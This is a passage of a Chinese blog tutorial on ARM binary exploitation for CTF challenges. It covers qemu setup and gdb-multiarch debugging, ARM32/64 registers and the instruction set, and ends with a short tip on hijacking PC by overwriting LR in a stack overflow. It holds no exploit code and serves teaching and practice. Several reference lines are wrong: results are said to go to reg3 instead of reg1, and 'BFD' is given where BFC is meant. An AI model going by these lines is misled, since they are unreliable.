&lt;reg-list&gt;：向reg1地址存入寄存器组中的多个字。如果reg1后有叹号，则在保存值后自动增加（STMIA）或减少（STMDB）reg1。</span><br></pre></td></tr></table></figure>\n\n<p>注意：后序指令不能使用PC寻址。</p>\n<h4 id=\"入栈出栈\"><a href=\"#入栈出栈\" class=\"headerlink\" title=\"入栈出栈\"></a>入栈出栈</h4><p>虽然ARM与x86都使用push和pop指令进行入栈和出栈，但ARM可以实现一条指令多次出入栈。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PUSH &lt;reg-list&gt;：将寄存器组中的寄存器值依次入栈，reg-list中可以有PC、LR寄存器。</span><br><span class=\"line\">POP &lt;reg-list&gt;：将出栈的值依次存入寄存器组中的寄存器，reg-list中可以有PC、LR寄存器。</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"算术运算\"><a href=\"#算术运算\" class=\"headerlink\" title=\"算术运算\"></a>算术运算</h4><p>不同于x86指令的大多数算术运算使用两个寄存器，ARM指令的算数运算指令<strong>通常包含3个寄存器</strong>，实现运算后的自由赋值而不是x86中必须赋值给目标寄存器且目标寄存器必须参与运算。</p>\n<p>第一个操作数用于<strong>保存运算结果</strong>，第二个操作数作<strong>被</strong>加/减/乘/除数，第三个操作数作加/减/乘/除数。</p>\n<p><code>ADD/C</code>加/进位加、<code>SUB/SBC</code>减/借位减、<code>MUL</code>乘、<code>U/SDIV</code>无/有符号除法…</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ADD/SUB reg1, &lt;reg2&gt;, &lt;reg3/imm32&gt;：计算&lt;reg2&gt;(+/-)&lt;reg3/imm32&gt;将结果保存到reg3</span><br><span class=\"line\">ADC/SBC reg1, &lt;reg2&gt;, reg3：计算&lt;reg2&gt;(+/-)reg3+(进位/借位)将结果保存到reg3</span><br><span class=\"line\">ADC &lt;reg32&gt;, &lt;imm32&gt;：计算reg32+imm32+进位将结果保存到reg32</span><br><span class=\"line\">SBC reg1, &lt;reg2&gt;, &lt;imm32&gt;：计算&lt;reg2&gt;-imm32-借位将结果保存到reg1</span><br><span class=\"line\">RSB reg1, &lt;reg2&gt;, &lt;reg3/imm32&gt;：计算&lt;reg3/imm&gt;-&lt;reg2&gt;将结果保存到reg1</span><br><span class=\"line\">MUL reg1, &lt;reg2&gt;, reg3：计算&lt;reg2&gt;*reg3将结果保存到reg1</span><br><span class=\"line\">UDIV/SDIV reg1, &lt;reg2&gt;, reg3：计算&lt;reg2&gt;/reg3（无符号/有符号）将结果保存到reg1，如果除以0，则结果为0</span><br><span class=\"line\">MLA reg1, &lt;reg2&gt;, reg3, &lt;reg4-32&gt;：计算reg1=&lt;reg2&gt;*reg3+&lt;reg4-32&gt;</span><br><span class=\"line\">MLS reg1, &lt;reg2&gt;, reg3, &lt;reg4-32&gt;：计算reg1=-&lt;reg2&gt;*reg3-&lt;reg4-32&gt;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"移位运算\"><a href=\"#移位运算\" class=\"headerlink\" title=\"移位运算\"></a>移位运算</h4><p><code>ASR</code>算术右移（补充符号位）、<code>LSL</code>逻辑左移、<code>LSR</code>逻辑右移、<code>ROR</code>循环右移。</p>\n<p>如果有两个操作数：第一个操作数用于<strong>保存运算结果</strong>，也是<strong>被移位的数</strong>，第二个操作数是<strong>移动的位数</strong></p>\n<p>如果有三个操作数：第一个操作数用于<strong>保存运算结果</strong>，第二个操作数是<strong>被移位的数</strong>，第三个操作数是<strong>移动的位数</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ASR/LSL/LSR reg1, &lt;reg2&gt;&#123;, &lt;reg3/imm32&gt;&#125;：如果reg3/imm存在，则表示reg1=&lt;reg2&gt;(&gt;&gt;/&lt;&lt;)&lt;reg3/imm32&gt;，否则表示reg1=reg1(&gt;&gt;/&lt;&lt;)&lt;reg2&gt;（算数右移、逻辑左移、逻辑右移）</span><br><span class=\"line\">ROR reg1, &lt;reg2&gt;&#123;, reg3&#125;：如果reg3存在，则表示reg1=&lt;reg2&gt;(&gt;&gt;)reg3，否则表示reg1=reg1(&gt;&gt;)&lt;reg2&gt;（循环右移）</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"数据取反\"><a href=\"#数据取反\" class=\"headerlink\" title=\"数据取反\"></a>数据取反</h4><p>将寄存器中的值按字节进行取反。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">REV reg1, reg2：将reg2中的4字节数据按字节反转后赋值给reg1（reg2值不变），原先第0，1，2，3字节的内容被换到了第3，2，1，0字节。</span><br><span class=\"line\">REV16 reg1, reg2：将reg2中的4字节以字单位分为高字和低字分别进行反转后赋值给reg1（reg2值不变），原先第0，1，2，3字节的内容被换到了第1，0，3，2字节。</span><br><span class=\"line\">REVSH reg1, reg2：将reg2中的低2字节反转后有符号扩展赋值给reg1</span><br><span class=\"line\">REVH reg1, reg2：REV指令的16位表示，只反转低2字节。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"位域操作\"><a href=\"#位域操作\" class=\"headerlink\" title=\"位域操作\"></a>位域操作</h4><p>位域操作允许机器指令对寄存器中的特定位进行处理，在x86中好像是也有这样的指令，只是使用频率太低。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">BFD reg1, #lsb, #width：将reg1中从第lsb位开始的连续width位清零。</span><br><span class=\"line\">BFI reg1, reg2, #lsb, #width：将reg2中最低width位复制到reg1中从lsb位开始的连续width位。</span><br><span class=\"line\">CLZ reg1, reg2：计算reg2中高位0的个数并赋值给reg1，多用于浮点数计算。</span><br><span class=\"line\">RBIT reg1, reg2：反转reg2寄存器中的所有位并赋值给reg1。</span><br><span class=\"line\">SBFX/UBFX reg1, reg2, #lsb, #width：取reg2中从第lsb位开始的连续width位并有/无符号扩展，赋值给reg1。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"比较和测试指令\"><a href=\"#比较和测试指令\" class=\"headerlink\" title=\"比较和测试指令\"></a>比较和测试指令</h4><p>与x86使用cmp指令和test指令相似，ARM也有关于比较和测试的指令，且实现原理基本相同。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CMP reg1, reg2/imm：比较两个寄存器或寄存器与立即数，更新标志位APSR。</span><br><span class=\"line\">CMN reg1, reg2/imm：比较reg1和-reg2或-imm，更新标志位APSR。</span><br><span class=\"line\">TST reg1, reg2/imm：参照x86的test指令，相与测试，更新N（负数位）和Z（零）标志</span><br><span class=\"line\">TEQ reg1, reg2/imm：异或测试，更新N和Z标志</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"跳转指令\"><a href=\"#跳转指令\" class=\"headerlink\" title=\"跳转指令\"></a>跳转指令</h4><p><code>B</code>系列的位跳转指令，<code>BL</code>相当于<code>call</code>。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">B/B.W &lt;label&gt;：无条件跳转到指定位置，B.W跳转范围更大。</span><br><span class=\"line\">BX reg：寄存器跳转。</span><br><span class=\"line\">BL &lt;label&gt; / BLX reg：跳转到指定位置/寄存器值，且将返回地址保存到LR寄存器中，类比x86的call指令。一般在函数开头都会首先将BL寄存器的值保存到栈中便于返回时获取。</span><br><span class=\"line\">条件跳转指令族：类比x86指令：</span><br><span class=\"line\">BEQ == je</span><br><span class=\"line\">BNE == jne</span><br><span class=\"line\">BCS/BHS == jc（进位标志为1，可表示无符号大于等于）</span><br><span class=\"line\">BCC/BLO == jnc（进位标志为0，可表示无符号小于）</span><br><span class=\"line\">BMI == js（负数标志为1）</span><br><span class=\"line\">BPL == jns（负数标志为0）</span><br><span class=\"line\">BVS == jo（溢出标志为1）</span><br><span class=\"line\">BVC == jno（溢出标志为0）</span><br><span class=\"line\">BHI == ja（无符号大于）</span><br><span class=\"line\">BLS == jbe（无符号小于等于）</span><br><span class=\"line\">BGE == jge（有符号大于等于）</span><br><span class=\"line\">BLE == jle（有符号小于等于）</span><br><span class=\"line\">BGT == jg（有符号大于）</span><br><span class=\"line\">BLT == jl（有符号小于）</span><br><span class=\"line\">CBZ/CBNZ reg, &lt;label&gt;：比较寄存器的值为0/不为0时跳转（只支持前向跳转）</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"解题技巧\"><a href=\"#解题技巧\" class=\"headerlink\" title=\"解题技巧\"></a>解题技巧</h2><ol>\n<li>arm pwn程序在IDA反汇编后通常都是一大堆sub函数，有许多常用的函数都没有符号，这时<strong>不要硬逆</strong>。arm程序逻辑较为简单，可通过<strong>运行</strong>大致猜测是什么函数。<strong>（三分逆，七分猜</strong></li>\n<li>栈溢出时覆盖<code>LR</code>在栈上的位置，并通过劫持<code>PC</code>不断控制执行流。</li>\n<li>在面对静态链接的程序，IDA打开之后会发现里面有几百个函数，而且也搜不到main函数，在这种情况下，可以利用搜<strong>索关键字符串，通过关键字符串去找主函数</strong>。</li>\n</ol>\n","site":{"data":{}},"excerpt":"<p>Arm架构下的pwn与x86类似，只是用的是RISC的处理器架构，指令集会与x86有较大的差别。Arm广泛地使用在许多嵌入式系统设计。由于节能的特点，ARM处理器非常适用于移动通讯领域，符合其主要设计目标为低耗电的特性。因此我们常用的手机、平板等移动设备都是采用ARM体系架构的，因此CTF中不可避免也会出现ARM架构的pwn题，但是相比x86会简单许多，通常都是普通的栈溢出。</p>","more":"<h2 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h2><p>本地的机器大多都是<code>x86</code>架构的，无法运行<code>ARM</code>架构的程序，需要我们通过<code>qemu</code>来运行。</p>\n<h3 id=\"32位\"><a href=\"#32位\" class=\"headerlink\" title=\"32位\"></a>32位</h3><p>采用命令<code>qemu-arm prog_name</code>运行。</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">qemu-arm -L /usr/arm-linux-gnueabi/ ./prog <span class=\"comment\"># 不是hf的</span></span><br><span class=\"line\">qemu-arm -L /usr/arm-linux-gnueabihf/ ./prog <span class=\"comment\"># hf的</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"64位\"><a href=\"#64位\" class=\"headerlink\" title=\"64位\"></a>64位</h3><p>采用命令<code>qemu-aarch64 ./prog</code>运行。</p>\n<p>但对于<strong>动态链接</strong>的程序还是无法正常运行，此时需要安装对应架构的动态链接库才行：（<code>arm64</code>和<code>aarch64</code>是同一个架构的不同名称）</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt search <span class=\"string\">&quot;libc6&quot;</span> | grep arm</span><br><span class=\"line\">sudo apt install libc6-dbg-arm64-cross <span class=\"comment\"># 或其他的库</span></span><br></pre></td></tr></table></figure>\n\n<p>安装完成后在<code>/usr</code>目录下会出现<code>aarch64-linux-gnu</code>这个文件夹，该文件夹即对应刚安装好的arm64位libc库，之后我们使用下面的命令指定arm程序的动态链接器，即可运行程序，32位类似。</p>\n<p>通过<code>-L </code>指定libc<code>qemu-aarch64 -L /usr/aarch64-linux-gnu/ ./prog</code></p>\n<p><code>armel</code>和<code>armhf</code>，这主要是针对浮点计算来区分的，其中<code>armel (arm eabi little endian)</code>使用fpu浮点运算单元，但传参还是用<strong>普通寄存器</strong>；<code>armhf (arm hard float)</code>也使用fpu浮点运算单元，同时使用fpu中的<strong>浮点寄存器</strong>传参。</p>\n<p><code>arm64</code>默认用的是<code>armhf</code>，所以也就没有这个后缀，因此<strong>有这个后缀区分的都是指的是32位arm架构</strong>。</p>\n<h3 id=\"大端序的arm\"><a href=\"#大端序的arm\" class=\"headerlink\" title=\"大端序的arm\"></a>大端序的arm</h3><p>采用命令<code>qemu-armeb</code>运行。</p>\n<h3 id=\"调试\"><a href=\"#调试\" class=\"headerlink\" title=\"调试\"></a>调试</h3><p>在<code>qemu</code>启动程序时通过<code>-g</code>指定端口：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># qemu-arch -g port -L /usr/arch-lib-dir/ ./prog</span></span><br><span class=\"line\">qemu-arm -g 8888 ./typo</span><br></pre></td></tr></table></figure>\n\n<p>利用<code>gdb-multiarch</code>连上端口进行调试：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ gdb-multiarch</span><br><span class=\"line\">......</span><br><span class=\"line\">......</span><br><span class=\"line\">pwndbg&gt; <span class=\"built_in\">set</span> architecture arm</span><br><span class=\"line\">The target architecture is assumed to be arm</span><br><span class=\"line\">pwndbg&gt; target remote localhost:8888</span><br></pre></td></tr></table></figure>\n\n<p>在<code>pwntools</code>中调试的话需要修改下代码：</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p = process([<span class=\"string\">&quot;qemu-arm&quot;</span>, <span class=\"string\">&quot;-g&quot;</span>, <span class=\"string\">&quot;8888&quot;</span>, <span class=\"string\">&quot;./typo&quot;</span>])</span><br></pre></td></tr></table></figure>\n\n<p>如果32位遇见这个报错的话：<code>/lib/ld-linux-armhf.so.3: No such file or directory</code></p>\n<p>输入命令<code>sudo apt-get install libc6-armhf-cross</code></p>\n<p>如果遇见这个报错的话：<code>Invalid ELF image for this architecture</code></p>\n<p>说明用的<code>qemu</code>架构不对</p>\n<h2 id=\"基础知识\"><a href=\"#基础知识\" class=\"headerlink\" title=\"基础知识\"></a>基础知识</h2><h3 id=\"寄存器\"><a href=\"#寄存器\" class=\"headerlink\" title=\"寄存器\"></a>寄存器</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">32位：</span><br><span class=\"line\">R0, R1, R2, R3, R4, R5, R6, R7, R8, R9, R10, R11, R12, R13, R14, R15...</span><br><span class=\"line\">64位：</span><br><span class=\"line\">X0, X1, X2, X3, X4, X5, X6, X7, X8, X9, X10, X11, X12, X13, X14, X15...</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"32位-1\"><a href=\"#32位-1\" class=\"headerlink\" title=\"32位\"></a>32位</h4><p><img src=\"./ArmPwn/arm32register\" alt=\"arm\"></p>\n<ul>\n<li><code>R0~R3</code>主要用于子程序之间的<strong>参数传递</strong>，剩下的参数<strong>从右向左</strong>依次入栈， 被调用者实现栈平衡，函数的<strong>返回值保存在 <code>R0</code></strong> 中</li>\n<li><code>R4~R11</code>主要用于<strong>保存局部变量</strong>，但在 Thumb 程序中，通常只能使用<code>R4~R7</code>来保存局部变量</li>\n<li><code>R12</code>用作子程序间scratch 寄存器，即 ip 寄存器</li>\n<li><code>R13</code>为<code>SP</code>，即栈指针。在物理上实际上有两个栈指针：主栈指针(MSP)和进程栈指针(PSP)，一般的进程只有一个栈指针可见。这个也好理解，就好比在x86-64系统中，内核的栈指针和用户进程的栈指针不同一样。</li>\n<li><code>R14</code>为链接寄存器<code>LR</code>，用于保存函数或子程序调用时<strong>返回地址</strong>。在x86-64系统中，函数调用的返回值是保存在子函数栈帧的上面，即<code>rbp+8</code>的位置，在ARM系统中，函数调用同样需要将返回地址保存到栈中，因为<code>LR</code>在函数返回时会进行自动更新，如果栈中没有返回地址，那么<code>LR</code>就不知道要更新成什么值了。</li>\n<li><code>PC</code>为程序计数器。<code>PC</code>的最低有效位（LSB）是一个控制结构，为1时表示进入Thumb状态。当有些时候程序跳转更新PC时需要将新PC值的LSB置1，否则会触发错误异常。这也可以看做是一种程序恶意跳转的保护机制。有时还会将<code>PC</code>作为基址访问数据。</li>\n</ul>\n<p>除了这些寄存器之外，还有一些特殊寄存器，他们未经过存储器映射,可以使用MSR和MRS等特殊寄存器访问指令来进行访问。</p>\n<p> 程序状态寄存器包括以下三个状态寄存器：</p>\n<ul>\n<li>应用PSR（APSR）</li>\n<li>执行PSR（EPSR）</li>\n<li>中断PSR（IPSR）</li>\n</ul>\n<p>中断/异常屏蔽寄存器：</p>\n<ul>\n<li>PRIMASK</li>\n<li>FAULTMASK</li>\n<li>BASEPRI</li>\n<li>只有特权状态才可以操作三个寄存器（非特权状态下的写操作会被忽略，读操作返回0）。三个寄存器默认值为0，即屏蔽（禁止异常/中断）不起作用。</li>\n</ul>\n<p>CONTROL寄存器</p>\n<p>另外，在x86-64架构和ARM架构中都有很多的<strong>浮点数</strong>寄存器，用于进行浮点数计算。在ARM架构中，浮点数寄存器有32个32位寄存器<code>S0~S31</code>，其中可以两两组合访问为<code>D0~D15</code>，如<code>S0</code>和<code>S1</code>组合为<code>D0</code>。</p>\n<h4 id=\"64位-1\"><a href=\"#64位-1\" class=\"headerlink\" title=\"64位\"></a>64位</h4><p>ARMv8有31个通用寄存器<code>X0-X30</code>, 还有<code>SP</code>、<code>PC</code>、<code>XZR</code>等寄存器</p>\n<ul>\n<li><code>X0-X7</code> 用于<strong>参数传递</strong></li>\n<li><code>X9-X15</code> 在子函数中使用这些寄存器时，直接使用即可, 无需save/restore. 在汇编代码中x9-x15出现的频率极低</li>\n<li><code>X19-X29</code> 在callee子函数中使用这些寄存器时，需要<strong>先save</strong>这些寄存器，在退出子函数时再resotre</li>\n<li><code>X8, X16-X18, X29, X30</code> 这些都是特殊用途的寄存器<ul>\n<li><code>X8</code>： 用于<strong>返回结果</strong></li>\n<li><code>X16</code>、<code>X17 </code>：进程内临时寄存器</li>\n<li><code>X18</code> ：resrved for ABI</li>\n<li><code>X29</code> ：<code>FP</code>（frame pointer register）</li>\n<li><code>X30</code> ：<code>LR</code>，用于保存函数或子程序调用时<strong>返回地址</strong>。</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"指令集\"><a href=\"#指令集\" class=\"headerlink\" title=\"指令集\"></a>指令集</h3><p><strong>指令、伪指令</strong></p>\n<p>（汇编）指令： 是机器码的<strong>助记符</strong>，经过汇编器编译后，由CPU执行。</p>\n<p>（汇编）伪指令：用来<strong>指导</strong>指令执行，是汇编器的产物，<strong>最终不会生成机器码</strong>。</p>\n<p><strong>有两种不同风格的ARM指令</strong></p>\n<ol>\n<li><p>ARM官方的ARM汇编风格：指令一般用大写。</p>\n</li>\n<li><p>GNU风格的ARM汇编：指令一般用小写。</p>\n</li>\n</ol>\n<p>ARM的指令集和x86-64有一些相似之处，但也有一些不同，需要注意的是，<strong>ARM的立即数前面需要加上#标识</strong>，如#0x12345678。下面的指令均为32位系统下的指令。</p>\n<h4 id=\"寄存器与寄存器（立即数）之间的数据传送（MOV系列指令）\"><a href=\"#寄存器与寄存器（立即数）之间的数据传送（MOV系列指令）\" class=\"headerlink\" title=\"寄存器与寄存器（立即数）之间的数据传送（MOV系列指令）\"></a>寄存器与寄存器（立即数）之间的数据传送（<code>MOV</code>系列指令）</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MOV/MOVS reg1, &lt;reg2/imm8&gt;：赋值reg1为reg2/imm8</span><br><span class=\"line\">MOVW &lt;reg32&gt;, &lt;imm16&gt;：赋值reg32的低16位为imm16</span><br><span class=\"line\">MOVT &lt;reg32&gt;, &lt;imm16&gt;：赋值reg32的高16位为imm16</span><br><span class=\"line\">MVN reg1, &lt;reg2&gt;：将reg2的值取反之后赋值给reg1</span><br><span class=\"line\">LDR &lt;reg32&gt;, =&lt;imm32&gt;：赋值reg32为imm32</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"存储器传送数据（LDR和STR系列指令）\"><a href=\"#存储器传送数据（LDR和STR系列指令）\" class=\"headerlink\" title=\"存储器传送数据（LDR和STR系列指令）\"></a>存储器传送数据（<code>LDR</code>和<code>STR</code>系列指令）</h4><p>ARM使用单独的指令集进行寄存器和内存空间的数据交换，其中基址可以选择任意一个通用寄存器或PC寄存器，变址也可以使用任意一个通用寄存器，较x86更加灵活：</p>\n<p><code>LDR</code>：加载某一地址的内容到寄存器</p>\n<p><code>STR</code>：存储寄存器的内容到某一地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LDRB/LDRH/LDR reg1, [&lt;reg2/PC&gt;, &lt;imm32&gt;]&lt;!&gt;：赋值8/16/32位reg2+imm32地址的数据到reg1，如果指令后面有叹号，表示指令执行后reg2值更新为reg2+imm32，有叹号可等同于 LDRB/LDRH/LDR reg1, [&lt;reg2&gt;], &lt;imm32&gt;，这种形式称为后序指令。</span><br><span class=\"line\">LDRD reg1, &lt;reg2&gt;, [&lt;reg3/PC&gt;, &lt;imm32&gt;]&lt;!&gt;：赋值64位reg3+imm32地址的数据到reg1和reg2，有叹号可等同于 LDRD reg1, &lt;reg2&gt;, [reg3], &lt;imm32&gt;</span><br><span class=\"line\">LDRSB/LDRSH reg1, [&lt;reg2/PC&gt;, &lt;imm32&gt;]&lt;!&gt;：有符号传送8/16位reg2+imm32地址的数据到reg1，目标寄存器会进行32位有符号扩展，有叹号可等同于 LDRSB/LDRSH reg1, [&lt;reg2&gt;], &lt;imm32&gt;</span><br><span class=\"line\">STRB/STRH/STR reg1, [&lt;reg2&gt;, &lt;imm32&gt;]&lt;!&gt;：保存寄存器reg1的8/16/32位值到reg2+imm32地址，有叹号可等同于 STRB/STRH/STR reg1, [&lt;reg2&gt;], &lt;imm32&gt;</span><br><span class=\"line\">STRD reg1, &lt;reg2&gt;, [reg3, &lt;imm32&gt;]&lt;!&gt;：保存寄存器reg1和reg2的64位值值到reg3+imm32地址，有叹号可等同于 STRD reg1, &lt;reg2&gt;, [reg3], &lt;imm32&gt;</span><br><span class=\"line\">LDRB/LDRH/LDR reg1, [&lt;reg2/PC&gt;, reg3&#123;, LSL &lt;imm&gt;&#125;]：赋值寄存器reg1的值为reg2/PC+(reg3&#123;&lt;&lt;imm&#125;)地址处的8/16/32位值</span><br><span class=\"line\">LDRD reg1, &lt;reg2&gt;, [&lt;reg3/PC&gt;, &lt;reg4-32&gt;&#123;, LSL &lt;imm&gt;&#125;]：赋值寄存器reg1和reg2的值为reg3/PC+(reg4-32&#123;&lt;&lt;imm&#125;)地址处的64位值</span><br><span class=\"line\">STRB/STRH/STR reg1, [&lt;reg2&gt;, reg3&#123;, LSL &lt;imm&gt;&#125;]：保存寄存器reg1的8/16/32位值到reg2+(reg3&#123;&lt;&lt;imm&#125;)地址</span><br><span class=\"line\">LDMIA/LDMDB reg1&lt;!&gt;, &lt;reg-list&gt;：将reg1地址的值按照顺序保存到reg-list中的寄存器中，如果reg1后有叹号，则在保存值后自动增加（LDMIA）或减少（LDMDB）reg1。如LDMIA R0, &#123;R1-R5&#125;，LDMIA R0, &#123;R1, R3, R6-R9&#125;</span><br><span class=\"line\">STMIA/STMDB reg1&lt;!&gt;, &lt;reg-list&gt;：向reg1地址存入寄存器组中的多个字。如果reg1后有叹号，则在保存值后自动增加（STMIA）或减少（STMDB）reg1。</span><br></pre></td></tr></table></figure>\n\n<p>注意：后序指令不能使用PC寻址。</p>\n<h4 id=\"入栈出栈\"><a href=\"#入栈出栈\" class=\"headerlink\" title=\"入栈出栈\"></a>入栈出栈</h4><p>虽然ARM与x86都使用push和pop指令进行入栈和出栈，但ARM可以实现一条指令多次出入栈。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PUSH &lt;reg-list&gt;：将寄存器组中的寄存器值依次入栈，reg-list中可以有PC、LR寄存器。</span><br><span class=\"line\">POP &lt;reg-list&gt;：将出栈的值依次存入寄存器组中的寄存器，reg-list中可以有PC、LR寄存器。</span><br></pre></td></tr></table></figure>\n\n\n\n<h4 id=\"算术运算\"><a href=\"#算术运算\" class=\"headerlink\" title=\"算术运算\"></a>算术运算</h4><p>不同于x86指令的大多数算术运算使用两个寄存器，ARM指令的算数运算指令<strong>通常包含3个寄存器</strong>，实现运算后的自由赋值而不是x86中必须赋值给目标寄存器且目标寄存器必须参与运算。</p>\n<p>第一个操作数用于<strong>保存运算结果</strong>，第二个操作数作<strong>被</strong>加/减/乘/除数，第三个操作数作加/减/乘/除数。</p>\n<p><code>ADD/C</code>加/进位加、<code>SUB/SBC</code>减/借位减、<code>MUL</code>乘、<code>U/SDIV</code>无/有符号除法…</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ADD/SUB reg1, &lt;reg2&gt;, &lt;reg3/imm32&gt;：计算&lt;reg2&gt;(+/-)&lt;reg3/imm32&gt;将结果保存到reg3</span><br><span class=\"line\">ADC/SBC reg1, &lt;reg2&gt;, reg3：计算&lt;reg2&gt;(+/-)reg3+(进位/借位)将结果保存到reg3</span><br><span class=\"line\">ADC &lt;reg32&gt;, &lt;imm32&gt;：计算reg32+imm32+进位将结果保存到reg32</span><br><span class=\"line\">SBC reg1, &lt;reg2&gt;, &lt;imm32&gt;：计算&lt;reg2&gt;-imm32-借位将结果保存到reg1</span><br><span class=\"line\">RSB reg1, &lt;reg2&gt;, &lt;reg3/imm32&gt;：计算&lt;reg3/imm&gt;-&lt;reg2&gt;将结果保存到reg1</span><br><span class=\"line\">MUL reg1, &lt;reg2&gt;, reg3：计算&lt;reg2&gt;*reg3将结果保存到reg1</span><br><span class=\"line\">UDIV/SDIV reg1, &lt;reg2&gt;, reg3：计算&lt;reg2&gt;/reg3（无符号/有符号）将结果保存到reg1，如果除以0，则结果为0</span><br><span class=\"line\">MLA reg1, &lt;reg2&gt;, reg3, &lt;reg4-32&gt;：计算reg1=&lt;reg2&gt;*reg3+&lt;reg4-32&gt;</span><br><span class=\"line\">MLS reg1, &lt;reg2&gt;, reg3, &lt;reg4-32&gt;：计算reg1=-&lt;reg2&gt;*reg3-&lt;reg4-32&gt;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"移位运算\"><a href=\"#移位运算\" class=\"headerlink\" title=\"移位运算\"></a>移位运算</h4><p><code>ASR</code>算术右移（补充符号位）、<code>LSL</code>逻辑左移、<code>LSR</code>逻辑右移、<code>ROR</code>循环右移。</p>\n<p>如果有两个操作数：第一个操作数用于<strong>保存运算结果</strong>，也是<strong>被移位的数</strong>，第二个操作数是<strong>移动的位数</strong></p>\n<p>如果有三个操作数：第一个操作数用于<strong>保存运算结果</strong>，第二个操作数是<strong>被移位的数</strong>，第三个操作数是<strong>移动的位数</strong></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ASR/LSL/LSR reg1, &lt;reg2&gt;&#123;, 